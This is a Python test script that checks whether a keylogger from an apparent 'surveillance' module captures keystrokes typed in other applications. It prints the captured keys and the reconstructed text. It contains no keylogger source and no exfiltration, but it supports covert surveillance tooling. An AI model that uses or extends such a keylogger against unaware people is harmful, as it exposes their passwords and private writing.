#!/usr/bin/env python3
"""
Test script to verify keylogger actually captures keystrokes
"""
import sys
import os
import time

# Add the modules path
MODULES_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), 'modules'))
if MODULES_PATH not in sys.path:
    sys.path.append(MODULES_PATH)

from modules.surveillance import start_keylogger, stop_keylogger, is_keylogger_running

def test_keylogger_capture():
    """Test that the keylogger actually captures keystrokes"""
    
    print("=== Testing Keylogger Keystroke Capture ===")
    
    # Start keylogger
    print("\n1. Starting keylogger...")
    start_result = start_keylogger()
    print(f"   Start result: {start_result}")
    
    if start_result.get('status') != 'success':
        print("   ❌ Failed to start keylogger")
        return
    
    # Wait for user to type
    print("\n2. Keylogger is now running!")
    print("   Please type some text in any application (like Notepad)")
    print("   Type for about 10 seconds, then come back here...")
    
    # Countdown
    for i in range(10, 0, -1):
        print(f"   Time remaining: {i} seconds...", end='\r')
        time.sleep(1)
    print("\n   Time's up! Stopping keylogger...")
    
    # Stop keylogger and get data
    print("\n3. Stopping keylogger...")
    stop_result = stop_keylogger()
    print(f"   Stop result: {stop_result}")
    
    # Check if we got data
    if stop_result.get('status') == 'success':
        data = stop_result.get('data', [])
        if data:
            print(f"\n4. ✅ Successfully captured {len(data)} keystrokes!")
            print("   First few keystrokes:")
            for i, key_data in enumerate(data[:10]):
                print(f"      {i+1}. '{key_data.get('key', 'Unknown')}' at {key_data.get('timestamp', 'Unknown')}")
            
            # Show full text
            full_text = ''.join([k.get('key', '') for k in data if k.get('type') == 'char'])
            if full_text:
                print(f"\n   Full captured text: '{full_text}'")
            else:
                print("\n   No text characters captured (only special keys)")
        else:
            print("\n4. ❌ No keystrokes captured!")
            print("   This might indicate a permissions or focus issue")
    else:
        print(f"\n4. ❌ Failed to stop keylogger: {stop_result}")
    
    print("\n=== Keylogger Capture Test Complete ===")

if __name__ == "__main__":
    test_keylogger_capture()
